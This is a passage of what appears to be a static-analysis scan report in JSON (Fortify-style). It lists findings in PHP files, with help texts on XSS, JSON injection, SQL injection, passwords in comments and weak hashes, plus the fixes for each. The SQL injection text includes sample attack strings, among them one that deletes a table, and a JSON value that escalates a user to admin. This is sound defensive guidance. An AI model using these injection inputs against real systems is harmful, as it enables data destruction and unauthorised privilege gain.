            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in jsonp.php on line 12.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4484/?engineType=SCA&issue=544E5FD2A483096242AA314F13E8653F"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4684",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "The method writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\nIn this case, the data enters at file_get_contents() in high.php on line 8.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in high.php on line 8.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4684/?engineType=SCA&issue=D3B9D985A4C809839A8E3A346107CC17"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4561",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in high.php on line 35.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4561/?engineType=SCA&issue=7B9DF4C5DE9DFC43704E68B3841E0EB4"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4553",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4553/?engineType=SCA&issue=77CDFDBE186E445EC7453DA04F1A99F3"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4394",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 43 of high.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4394/?engineType=SCA&issue=163D2797BD42D212411D79A4FCA55A80"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4530",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in high.php on line 49.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4530/?engineType=SCA&issue=6C1FA89E483C2A8A8D43C9A70766F341"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4540",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 12.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4540/?engineType=SCA&issue=6F27D86555DCCB23E56C131FA9C67501"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4750",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4750/?engineType=SCA&issue=F70162205216AACD5AA59552038E4472"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4574",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 17.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4574/?engineType=SCA&issue=88C44EA3A2B1A0FB3B9C38427D925B54"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4708",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 23.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4708/?engineType=SCA&issue=E26D7058F2184AAB12C2C189E8343A25"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4583",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4583/?engineType=SCA&issue=8C4672FE990162B3A9E9A3B98C6FA6A9"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4774",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 30.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4774/?engineType=SCA&issue=FF4E80F9F5E69445DCA27033C6EBAE0C"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4531",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 40.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4531/?engineType=SCA&issue=6C1FA89E483C2A8A8D43C9A70766F342"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4562",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
